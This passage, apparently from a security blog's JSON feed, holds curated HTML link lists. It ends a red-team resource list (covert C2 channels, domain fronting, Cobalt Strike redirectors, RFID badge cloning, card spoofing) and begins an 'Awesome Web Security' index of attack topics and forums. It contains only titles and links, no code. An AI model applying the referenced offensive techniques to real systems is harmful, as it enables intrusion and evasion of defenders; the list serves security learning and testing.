data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE3LTA1LTAyLXJlZC10ZWFtaW5nLWZvci1wYWNpZmljLXJpbS1jY2RjLTIwMTcv\">Pacific Rim CCDC 2017 中的红队</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE1LTA0LTE1LWhvdy1pLXByZXBhcmVkLXRvLXJlZC10ZWFtLWF0LXByY2NkYy0yMDE1Lw==\">在 PRCCDC 2015 中我是如何进行红队准备的？</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE2LTA1LTI0LXBhY2lmaWMtcmltLWNjZGNfMjAxNi8=\">Pacific Rim CCDC 2016 中的红队</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE3LTA4LTMwLXJhbmRvbWl6ZWQtbWFsbGVhYmxlLWMyLXByb2ZpbGVzLW1hZGUtZWFzeS8=\">随机化 Malleable 的 C2 配置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibHVlc2NyZWVub2ZqZWZmLmNvbS8yMDE2LTA2LTI4LWNvYmFsdC1zdHJpa2UtaHR0cC1jMi1yZWRpcmVjdG9ycy13aXRoLWFwYWNoZS1tb2RfcmV3cml0ZS8=\">使用 Apache 和 mod_rewrite 重定向 Cobalt Strike 的 HTTP C2 - Jeff Dimmock</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNy8wMi8wNi9oaWdoLXJlcHV0YXRpb24tcmVkaXJlY3RvcnMtYW5kLWRvbWFpbi1mcm9udGluZy8=\">高信誉的重定向与域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wMi90b3ItZnJvbnRpbmctdXRpbGlzaW5nLWhpZGRlbi1zZXJ2aWNlcy1mb3ItcHJpdmFjeS8=\">TOR Fronting – 利用隐藏服务保护隐私</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWRzZWMuY28udWsvMjAxNy8wMi9kb21haW4tZnJvbnRpbmctdmlhLWNsb3VkZnJvbnQtYWx0ZXJuYXRlLWRvbWFpbnMv\">通过 Cloudfront Alternate Domains 部署域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmVkdGVhbXNlY3VyZS5jb20vdGhlLXBsdWdib3QtaGFyZHdhcmUtYm90bmV0LXJlc2VhcmNoLXByb2plY3Qv\">PlugBot: 硬件僵尸网络研究项目</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL2F0dGFjay1pbmZyYXN0cnVjdHVyZS1sb2ctYWdncmVnYXRpb24tYW5kLW1vbml0b3JpbmctMzQ1ZTQxNzMwNDRl\">攻击基础设施日志聚合与监视</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3J2cnNoM2xsL0ZpbmRGcm9udGFibGVEb21haW5z\">发现前置域名</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL24wcGUtc2xlZC9BcGFjaGUyLU1vZC1SZXdyaXRlLVNldHVw\">安装 Apache2Mod Rewrite</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueG9ycmlvci5jb20vRW1waXJlLURvbWFpbi1Gcm9udGluZy8=\">Empre 域名前置</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pbmlzbGxjL2RvbWFpbmh1bnRlcg==\">域名猎手</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8xMC8yMS9taWdyYXRpbmcteW91ci1pbmZyYXN0cnVjdHVyZS8=\">迁移您的基础设施</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5ydnJzaDNsbC5uZXQvYmxvZy9vZmZlbnNpdmUvcmVkaXJlY3RpbmctY29iYWx0LXN0cmlrZS1kbnMtYmVhY29ucy8=\">重定向 Cobalt Strike 的 DNS Beacon</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGVvYnNpZGlhbnRvd2VyLmNvbS8yMDE3LzA3LzI0L2QwYTdjZmNlZWRjNDJiZGYzYTM2ZjI5MjZiZDUyODYzZWYyOGJlZmMuaHRtbA==\">发现 Azure 中的前置域名 - thoth / Fionnbharr (@a_profligate)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3liZXJhcmsuY29tL3RocmVhdC1yZXNlYXJjaC1ibG9nL3JlZC10ZWFtLWluc2lnaHRzLWh0dHBzLWRvbWFpbi1mcm9udGluZy1nb29nbGUtaG9zdHMtdXNpbmctY29iYWx0LXN0cmlrZS8=\">对 Google Host 中的 HTTPS 域名前置的红队洞察</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3B0aXYuY29tL2Jsb2cvZXNjYXBlLWFuZC1ldmFzaW9uLWVncmVzc2luZy1yZXN0cmljdGVkLW5ldHdvcmtz\">逃出出口受限网络 - Tom Steele and Chris Patten</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oYXJtajB5Lm5ldC9ibG9nL3Bvd2Vyc2hlbGwvY29tbWFuZC1hbmQtY29udHJvbC11c2luZy1hY3RpdmUtZGlyZWN0b3J5Lw==\">使用 Active Directory 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8yNi9jb21tYW5kLWFuZC1jb250cm9sLXR3aXR0ZXIv\">使用 Twitter 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8wNi9jb21tYW5kLWFuZC1jb250cm9sLWRucy8=\">使用 DNS 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wNy8yOC9jb21tYW5kLWFuZC1jb250cm9sLWljbXAv\">使用 ICMP 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOC8yOS9jb21tYW5kLWFuZC1jb250cm9sLWRyb3Bib3gv\">使用 Dropbox 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8xMC8wNC9jb21tYW5kLWFuZC1jb250cm9sLWh0dHBzLw==\">使用 HTTPS 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOS8xMi9jb21tYW5kLWFuZC1jb250cm9sLXdlYmRhdi8=\">使用 webdav 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW50ZXN0bGFiLmJsb2cvMjAxNy8wOC8wMy9jb21tYW5kLWFuZC1jb250cm9sLWdtYWlsLw==\">使用 Gmail 构建 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLm13cmluZm9zZWN1cml0eS5jb20vYmxvZy90YXNraW5nLW9mZmljZS0zNjUtZm9yLWNvYmFsdC1zdHJpa2UtYzIv\">使用 Office 365 的任务用于 Cobalt Strike 的 C2</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHlhcnR3b3JrLmVzLzIwMTcvMDEvMzEvc2ltcGxlLWRvbWFpbi1mcm9udGluZy1wb2Mtd2l0aC1nYWUtYzItc2VydmVyLw==\">GAE C2 服务器简单域名前置 PoC</span></li>\n</ul>\n<h2 id=\"-7\"><a class=\"anchor\" href=\"#-7\">#</a> <a href=\"#table-of-contents\">↑</a> 嵌入式与物理设备</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJ1c3R3YXZlLmNvbS9SZXNvdXJjZXMvU3BpZGVyTGFicy1CbG9nL0dldHRpbmctaW4td2l0aC10aGUtUHJveG1hcmstMy1hbmQtUHJveEJydXRlLw==\">从 Proxmark3 与 ProxBrute 开始</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm52aXNvLmJlLzIwMTcvMDEvMTEvYS1wcmFjdGljYWwtZ3VpZGUtdG8tcmZpZC1iYWRnZS1jb3B5aW5nLw==\">RFID Badge 复制实用指南</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHVubmVsc3VwLmNvbS9jb250ZW50cy1vZi1hLXBoeXNpY2FsLXBlbi10ZXN0ZXJzLWJhY2twYWNrLw==\">一个物理渗透测试人员的背包</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbXlrL21hZ3Nwb29m\">MagSpoof - 信用卡 / 磁条卡伪造</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zYW15LnBsL2tleXN3ZWVwZXIv\">无线键盘嗅探器</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmtjaHVuZy5jby9yZmlkLWhhY2tpbmctd2l0aC10aGUtcHJveG1hcmstMy8=\">使用 Proxmark 3 进行 RFID 入侵</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3MuYmhhbS5hYy51ay9+Z2FyY2lhZi9wdWJsaWNhdGlvbnMvVHV0b3JpYWxfUHJveG1hcmtfdGhlX1N3aXNzX0FybXlfS25pZmVfZm9yX1JGSURfU2VjdXJpdHlfUmVzZWFyY2gtUkZJRFNlYzEyLnBkZg==\">RFID 的瑞士军刀</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpYS5ibGFja2hhdC5jb20vYmgtdXMtMTIvQnJpZWZpbmdzL0NfTWlsbGVyL0JIX1VTXzEyX01pbGxlcl9ORkNfYXR0YWNrX3N1cmZhY2VfV1AucGRm\">探索 NFC 的攻击面</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2dlcmhhcmQuZGVrb25pbmdnYW5zLm5sL2RvY3VtZW50cy9wdWJsaWNhdGlvbnMvZGVrb25pbmdnYW5zLnBoZC50aGVzaXMucGRm\">智能卡</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmtjaHVuZy5jby9yZXZlcnNlLWVuZ2luZWVyaW5nLWhpZC1pY2xhc3MtbWFzdGVyLWtleXMv\">逆向 HID iClass 的主密钥</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucHduaWVleHByZXNzLmNvbS9hb3Bw\">Android Open Pwn Project (AOPP)</span></li>\n</ul>\n<h2 id=\"-8\"><a class=\"anchor\" href=\"#-8\">#</a> <a href=\"#table-of-contents\">↑</a> 杂项</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Z5c2VjL1JlZFRpcHM=\">Vysec 的红队技巧</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNi8wMi8yMy9jb2JhbHQtc3RyaWtlLXRpcHMtZm9yLTIwMTYtY2NkYy1yZWQtdGVhbXMv\">Cobalt Strike 红队技巧 - 2016</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wNy8wOS9tb2RlbHMtZm9yLXJlZC10ZWFtLW9wZXJhdGlvbnMv\">红队行动模型</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21hZ29vL3JlZHRlYW0tcGxhbg==\">红队实践计划</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1vY2xiYnF2YXdRZw==\">Raphael Mudge - 肮脏的红队技巧</span></li>\n</ul>\n<h2 id=\"-9\"><a class=\"anchor\" href=\"#-9\">#</a> <a href=\"#table-of-contents\">↑</a> 电子书籍</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9OZXh0LUdlbmVyYXRpb24tVGVhbWluZy1IZW5yeS1EYWx6aWVsL2RwLzAxMjgwNDE3MTQ=\">下一代红队行动</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9UYXJnZXRlZC1DeWJlci1BdHRhY2tzLU11bHRpLXN0YWdlZC1FeHBsb2l0cy9kcC8wMTI4MDA2MDQ4\">针对性网络攻击</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9BZHZhbmNlZC1QZW5ldHJhdGlvbi1UZXN0aW5nLUhhY2tpbmctTmV0d29ya3MvZHAvMTExOTM2NzY4OQ==\">高级渗透测试：入侵全球最安全的网络</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1hem9uLmNvbS9Tb2NpYWwtRW5naW5lZXJzLVBsYXlib29rLVByYWN0aWNhbC1QcmV0ZXh0aW5nL2RwLzA2OTIzMDY2MTcvcmVmPWFzX2xpX3NzX3RsP2llPVVURjgmYW1wO2xpbmtDb2RlPXNsMSZhbXA7dGFnPXRhbGFtYW50ZXN1cy0yMCZhbXA7bGlua0lkPTM3YjYzYzc3MDJjOWJlNmI5ZjZhMWI5MjFjODhjOGNk\">社会工程的手边书</span></li>\n</ul>\n<h2 id=\"-10\"><a class=\"anchor\" href=\"#-10\">#</a> <a href=\"#table-of-contents\">↑</a> 培训（免费）</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1JUnBTN29aM3owbyZhbXA7bGlzdD1QTDlITzZNX01VMm5lc3hTbWhKakV2d0xoVW9IUEhtWHZ6\">Tradecraft - 关于红队行动的课程</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNvYmFsdHN0cmlrZS5jb20vMjAxNS8wOS8zMC9hZHZhbmNlZC10aHJlYXQtdGFjdGljcy1jb3Vyc2UtYW5kLW5vdGVzLw==\">高级威胁战术课程与笔记</span></li>\n</ul>\n<h2 id=\"-11\"><a class=\"anchor\" href=\"#-11\">#</a> <a href=\"#table-of-contents\">↑</a> 认证</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jcmVzdC1hcHByb3ZlZC5vcmcvZXhhbWluYXRpb24vY2VydGlmaWVkLXNpbXVsYXRlZC1hdHRhY2stc3BlY2lhbGlzdC8=\">CREST 模拟攻击专家</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jcmVzdC1hcHByb3ZlZC5vcmcvZXhhbWluYXRpb24vY2VydGlmaWVkLXNpbXVsYXRlZC1hdHRhY2stbWFuYWdlci8=\">CREST 模拟攻击管理员</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2Fucy5vcmcvY291cnNlL3JlZC10ZWFtLW9wZXJhdGlvbnMtYW5kLXRocmVhdC1lbXVsYXRpb24=\">SEC564: 红队行动与威胁仿真</span></li>\n</ul>\n",
            "tags": [
                "RedTeam"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Reference/awesome-web-security/",
            "url": "https://or0kit.github.io/PenetrationTest/Reference/awesome-web-security/",
            "title": "Awesome Web Security【转】",
            "date_published": "2021-01-18T05:49:40.000Z",
            "content_html": "<h1 id=\"awesome-web-security-zh-awesome\"><a class=\"anchor\" href=\"#awesome-web-security-zh-awesome\">#</a> Awesome Web Security - ZH <a href=\"https://github.com/sindresorhus/awesome\"><img data-src=\"https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg\" alt=\"Awesome\" /></a></h1>\n<p><a href=\"https://www.w3.org/TR/html5/\"><img data-src=\"https://upload.wikimedia.org/wikipedia/commons/6/61/HTML5_logo_and_wordmark.svg\" align=\"right\" width=\"70\"></a></p>\n<blockquote>\n<p>🐶 Curated list of Web Security materials and resources.</p>\n</blockquote>\n<p>Needless to say, most websites suffer from various types of bugs which may eventually lead to vulnerabilities. Why would this happen so often? There can be many factors involved including misconfiguration, shortage of engineers' security skills, etc. To combat this, here is a curated list of Web Security materials and resources for learning cutting edge penetration techniques, and I highly encourage you to read this article &quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9zby15b3Utd2FudC10by1iZS1hLXdlYi1zZWN1cml0eS1yZXNlYXJjaGVy\">So you want to be a web security researcher?</span>&quot; first.</p>\n<p><em>Please read the <a href=\"CONTRIBUTING.md\">contribution guidelines</a> before contributing.</em></p>\n<hr />\n<p align=\"center\"><b>🌈 Want to strengthen your penetration skills?</b><br>I would recommend playing some <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Fwc2RlaGFsL2F3ZXNvbWUtY3Rm\">awesome-ctf</span>s.</p>\n<hr />\n<p>If you enjoy this awesome list and would like to support it, check out my <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGF0cmVvbi5jb20vYm9paw==\">Patreon</span> page 😃<br>Also, don't forget to check out my <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ng==\">repos</span> 🐾 or say <em>hi</em> on my <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9xYXpibm00NTY=\">Twitter</span>!</p>\n<h2 id=\"contents\"><a class=\"anchor\" href=\"#contents\">#</a> Contents</h2>\n<ul>\n<li><a href=\"#digests\">Digests</a></li>\n<li><a href=\"#forums\">Forums</a></li>\n<li><a href=\"#intro\">Introduction</a>\n<ul>\n<li><a href=\"#xss---cross-site-scripting\">XSS</a></li>\n<li><a href=\"#prototype-pollution\">Prototype Pollution</a></li>\n<li><a href=\"#csv-injection\">CSV Injection</a></li>\n<li><a href=\"#sql-injection\">SQL Injection</a></li>\n<li><a href=\"#command-injection\">Command Injection</a></li>\n<li><a href=\"#orm-injection\">ORM Injection</a></li>\n<li><a href=\"#ftp-injection\">FTP Injection</a></li>\n<li><a href=\"#xxe---xml-external-entity\">XXE</a></li>\n<li><a href=\"#csrf---cross-site-request-forgery\">CSRF</a></li>\n<li><a href=\"#clickjacking\">Clickjacking</a></li>\n<li><a href=\"#ssrf---server-side-request-forgery\">SSRF</a></li>\n<li><a href=\"#web-cache-poisoning\">Web Cache Poisoning</a></li>\n<li><a href=\"#relative-path-overwrite\">Relative Path Overwrite</a></li>\n<li><a href=\"#open-redirect\">Open Redirect</a></li>\n<li><a href=\"#saml\">SAML</a></li>\n<li><a href=\"#upload\">Upload</a></li>\n<li><a href=\"#rails\">Rails</a></li>\n<li><a href=\"#angularjs\">AngularJS</a></li>\n<li><a href=\"#reactjs\">ReactJS</a></li>\n<li><a href=\"#ssltls\">SSL/TLS</a></li>\n<li><a href=\"#webmail\">Webmail</a></li>\n<li><a href=\"#nfs\">NFS</a></li>\n<li><a href=\"#aws\">AWS</a></li>\n<li><a href=\"#azure\">Azure</a></li>\n<li><a href=\"#fingerprint\">Fingerprint</a></li>\n<li><a href=\"#sub-domain-enumeration\">Sub Domain Enumeration</a></li>\n<li><a href=\"#crypto\">Crypto</a></li>\n<li><a href=\"#web-shell\">Web Shell</a></li>\n<li><a href=\"#osint\">OSINT</a></li>\n<li><a href=\"#dns-rebinding\">DNS Rebinding</a></li>\n<li><a href=\"#deserialization\">Deserialization</a></li>\n<li><a href=\"#oauth\">OAuth</a></li>\n<li><a href=\"#jwt\">JWT</a></li>\n</ul>\n</li>\n<li><a href=\"#evasions\">Evasions</a>\n<ul>\n<li><a href=\"#evasions-xxe\">XXE</a></li>\n<li><a href=\"#evasions-csp\">CSP</a></li>\n<li><a href=\"#evasions-waf\">WAF</a></li>\n<li><a href=\"#evasions-jsmvc\">JSMVC</a></li>\n<li><a href=\"#evasions-authentication\">Authentication</a></li>\n</ul>\n</li>\n<li><a href=\"#tricks\">Tricks</a>\n<ul>\n<li><a href=\"#tricks-csrf\">CSRF</a></li>\n<li><a href=\"#tricks-clickjacking\">Clickjacking</a></li>\n<li><a href=\"#tricks-rce\">Remote Code Execution</a></li>\n<li><a href=\"#tricks-xss\">XSS</a></li>\n<li><a href=\"#tricks-sql-injection\">SQL Injection</a></li>\n<li><a href=\"#tricks-nosql-injection\">NoSQL Injection</a></li>\n<li><a href=\"#tricks-ftp-injection\">FTP Injection</a></li>\n<li><a href=\"#tricks-xxe\">XXE</a></li>\n<li><a href=\"#tricks-ssrf\">SSRF</a></li>\n<li><a href=\"#tricks-web-cache-poisoning\">Web Cache Poisoning</a></li>\n<li><a href=\"#tricks-header-injection\">Header Injection</a></li>\n<li><a href=\"#tricks-url\">URL</a></li>\n<li><a href=\"#tricks-deserialization\">Deserialization</a></li>\n<li><a href=\"#tricks-oauth\">OAuth</a></li>\n<li><a href=\"#tricks-others\">Others</a></li>\n</ul>\n</li>\n<li><a href=\"#browser-exploitation\">Browser Exploitation</a></li>\n<li><a href=\"#pocs\">PoCs</a>\n<ul>\n<li><a href=\"#pocs-database\">Database</a></li>\n</ul>\n</li>\n<li><a href=\"#cheetsheets\">Cheetsheets</a></li>\n<li><a href=\"#tools\">Tools</a>\n<ul>\n<li><a href=\"#tools-auditing\">Auditing</a></li>\n<li><a href=\"#tools-command-injection\">Command Injection</a></li>\n<li><a href=\"#tools-reconnaissance\">Reconnaissance</a>\n<ul>\n<li><a href=\"#tools-osint\">OSINT</a></li>\n<li><a href=\"#tools-sub-domain-enumeration\">Sub Domain Enumeration</a></li>\n</ul>\n</li>\n<li><a href=\"#tools-code-generating\">Code Generating</a></li>\n<li><a href=\"#tools-fuzzing\">Fuzzing</a></li>\n<li><a href=\"#tools-scanning\">Scanning</a></li>\n<li><a href=\"#tools-penetration-testing\">Penetration Testing</a></li>\n<li><a href=\"#tools-leaking\">Leaking</a></li>\n<li><a href=\"#tools-offensive\">Offensive</a>\n<ul>\n<li><a href=\"#tools-xss\">XSS</a></li>\n<li><a href=\"#tools-sql-injection\">SQL Injection</a></li>\n<li><a href=\"#tools-template-injection\">Template Injection</a></li>\n<li><a href=\"#tools-xxe\">XXE</a></li>\n<li><a href=\"#tools-csrf\">CSRF</a></li>\n<li><a href=\"#tools-ssrf\">SSRF</a></li>\n</ul>\n</li>\n<li><a href=\"#tools-detecting\">Detecting</a></li>\n<li><a href=\"#tools-preventing\">Preventing</a></li>\n<li><a href=\"#tools-proxy\">Proxy</a></li>\n<li><a href=\"#tools-webshell\">Webshell</a></li>\n<li><a href=\"#tools-disassembler\">Disassembler</a></li>\n<li><a href=\"#tools-decompiler\">Decompiler</a></li>\n<li><a href=\"#tools-dns-rebinding\">DNS Rebinding</a></li>\n<li><a href=\"#tools-others\">Others</a></li>\n</ul>\n</li>\n<li><a href=\"#social-engineering-database\">Social Engineering Database</a></li>\n<li><a href=\"#blogs\">Blogs</a></li>\n<li><a href=\"#twitter-users\">Twitter Users</a></li>\n<li><a href=\"#practices\">Practices</a>\n<ul>\n<li><a href=\"#practices-application\">Application</a></li>\n<li><a href=\"#practices-aws\">AWS</a></li>\n<li><a href=\"#practices-xss\">XSS</a></li>\n<li><a href=\"#practices-modsecurity\">ModSecurity / OWASP ModSecurity Core Rule Set</a></li>\n</ul>\n</li>\n<li><a href=\"#community\">Community</a></li>\n<li><a href=\"#miscellaneous\">Miscellaneous</a></li>\n</ul>\n<h2 id=\"digests\"><a class=\"anchor\" href=\"#digests\">#</a> Digests</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90cmlja2luZy5pby8=\">梧桐百科 - 碎片化知识学习</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4=\">@phith0n</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4vTWluZC1NYXA=\">phith0n/Mind-Map</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3BoaXRoMG4=\">@phith0n</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja2VyMTAxLmNvbS8=\">Hacker101</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaGFja2Vyb25lLmNvbS9zdGFydC1oYWNraW5n\">hackerone</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvZGFpbHktc3dpZw==\">The Daily Swig - Web security digest</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">PortSwigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20vYmxvZy93ZWItc2VjdXJpdHkv\">Web Application Security Zone by Netsparker</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmV0c3Bhcmtlci5jb20v\">Netsparker</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94dWFud3VsYWIuZ2l0aHViLmlvL2NuL3NlY25ld3MvMjAxOC8wMS8wMS9pbmRleC5odG1s\">腾讯玄武实验室安全动态推送</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3hsYWIudGVuY2VudC5jb20vY24v\">腾讯玄武实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc25lYWt5bW9ua2V5Lm5ldC8yMDE3LzA0LzIzL2luZm9zZWMtbmV3YmllLw==\">Infosec Newbie</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc25lYWt5bW9ua2V5Lm5ldC8=\">Mark Robinson</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iaXR2aWpheXMuZ2l0aHViLmlvLw==\">The Magic of Learning</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iaXR2aWpheXMuZ2l0aHViLmlvL2Fib3V0bWUuaHRtbA==\">@bitvijays</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90cmFpbG9mYml0cy5naXRodWIuaW8vY3RmLw==\">CTF Field Guide</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudHJhaWxvZmJpdHMuY29tLw==\">Trail of Bits</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9nb3R5b3VyLnB3Lw==\">Got Your PW</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MzMTMxMjEy\">@s3131212</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBvL1BheWxvYWRzQWxsVGhlVGhpbmdzLw==\">PayloadsAllTheThings</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3N3aXNza3lyZXBv\">@swisskyrepo</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90bGRyc2VjLmNvbS8=\">tl;dr sec</span> - Weekly summary of top security tools, blog posts, and security research.</li>\n</ul>\n<h2 id=\"forums\"><a class=\"anchor\" href=\"#forums\">#</a> Forums</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5waHJhY2sub3JnLw==\">Phrack Magazine</span> - Ezine written by and for hackers.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGVoYWNrZXJuZXdzLmNvbS8=\">The Hacker News</span> - Security in a serious way.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eXdlZWtseS5jb20v\">Security Weekly</span> - The security podcast network.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy50aGVyZWdpc3Rlci5jby51ay8=\">The Register</span> - Biting the hand that feeds IT.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGFya3JlYWRpbmcuY29tL0RlZmF1bHQuYXNw\">Dark Reading</span> - Connecting The Information Security Community.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2VuLmhhY2tkaWcuY29tLw==\">HackDig</span> - Dig high-quality web security articles for hacker.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tLw==\">安全客</span> - 有思想的安全新媒体 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BhcGVyLnNlZWJ1Zy5vcmcv\">Paper - 安全技术精粹</span> - Knowledge base for hacking technology built by 404 Team from <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cua25vd25zZWMuY29tLw==\">knownsec</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5mcmVlYnVmLmNvbS8=\">Freebuf</span> - Freebuf is the most popular forum in China for exchanging and sharing hacking technology.</li>\n<li><span 